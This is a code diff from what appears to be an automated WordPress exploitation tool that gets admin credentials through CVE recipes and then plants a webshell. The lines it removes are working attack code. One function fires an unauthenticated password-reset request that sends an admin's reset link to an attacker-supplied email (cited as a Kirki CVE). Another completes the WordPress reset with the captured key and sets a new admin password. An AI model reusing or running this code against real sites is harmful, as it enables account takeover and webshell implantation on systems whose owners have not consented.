@@ -13,15 +13,6 @@ credentials*. Stage 2 (wp_authshell) then plants a webshell. Success is
 confirmed downstream by actually logging in / planting, never by trusting the
 exploit's HTTP response. Recipe field values are CVE-specific — confirm them
 against the PoC (see wp_recipes for the shapes).
-
-One further kind is CONFIRM-ONLY (not fully automatable):
-
-  account-takeover-oob : an unauth password-reset endpoint that mails the reset
-                    link to an ATTACKER-supplied address (e.g. Kirki
-                    CVE-2026-8206). The tool can't read that mailbox, so it
-                    can't finish the takeover — it only PROVES the primitive
-                    fires (endpoint accepts an arbitrary email for a valid
-                    user → 200 + success marker) and returns {'confirmed_oob'}.
 """
 import json
 import re
@@ -72,8 +63,6 @@ def acquire_admin(base_url, http, recipe, creds=None):
             return _auth_bypass(base, http, recipe)
         if kind in ("password-reset", "account-takeover"):
             return _password_reset(base, http, recipe)
-        if kind in ("account-takeover-oob", "oob-account-takeover"):
-            return _account_takeover_oob(base, http, recipe)
     except Exception:
         return None
     return None
@@ -223,53 +212,3 @@ def _fetch_text(http, url):
         return getattr(r, "status_code", 0), (getattr(r, "text", "") or "")
     except Exception:
         return 0, ""
-
-
-def _account_takeover_oob(base, http, recipe):
-    """CONFIRM-ONLY: fire an unauth password-reset that mails the link to an
-    attacker address, and prove the endpoint accepted it. Cannot complete the
-    takeover (we can't read the mailbox), so never returns creds — just a
-    {'confirmed_oob': True} proof, or None if the endpoint rejected the request."""
-    target = recipe.get("target_user", "admin")
-    attacker = recipe.get("attacker_email", "pentest@mail.invalid")
-    data = dict(recipe.get("extra_params", {}))
-    data[recipe.get("user_param", "username")] = target
-    data[recipe.get("email_param", "email")] = attacker
-    headers = {}
-    nonce = _harvest_rest_nonce(base, http, recipe)
-    if nonce and recipe.get("nonce_header"):
-        headers[recipe["nonce_header"]] = nonce
-    r = http.post(base + recipe["endpoint"], data=data, headers=headers or None)
-    body = getattr(r, "text", "") or ""
-    marker = recipe.get("success_marker", "")
-    if getattr(r, "status_code", 0) == 200 and marker and marker in body:
-        return {"confirmed_oob": True,
-                "detail": f"{recipe['endpoint']} accepted an arbitrary email "
-                          f"({attacker}) for user '{target}' → reset link sent "
-                          f"to attacker. Complete the takeover from that mailbox."}
-    return None
-
-
-def complete_reset_key(base, http, reset_key, login="admin", new_password=None):
-    """Finish a WordPress password reset from a key captured out-of-band — e.g. the
-    reset link an OOB-takeover CVE (kirki CVE-2026-8206) mails to the attacker's
-    inbox. This is the one manual step account-takeover-oob can't automate: the
-    operator reads the key, then this closes it out. Mirrors wp-login.php's two-step
-    flow on the shared session — action=rp primes the wp-resetpass-<COOKIEHASH>
-    cookie (login:key), then action=resetpass POSTs the new password WITH rp_key,
-    which WP hash_equals's against the cookie's key (omitting rp_key is a PHP-8
-    TypeError → 500, not a silent no-op). Returns {'username','password'} when the
-    page confirms the reset, else None; the caller then logs in to prove it took."""
-    base = base.rstrip("/")
-    newpw = new_password or _random_creds()["password"]
-    login_url = base + "/wp-login.php"
-    try:
-        http.get(login_url, params={"action": "rp", "key": reset_key, "login": login})
-        r = http.post(login_url, params={"action": "resetpass"},
-                      data={"rp_key": reset_key, "pass1": newpw, "pass2": newpw,
-                            "wp-submit": "Reset Password"})
-    except Exception:
-        return None
-    if "has been reset" in (getattr(r, "text", "") or ""):
-        return {"username": login, "password": newpw}
-    return None
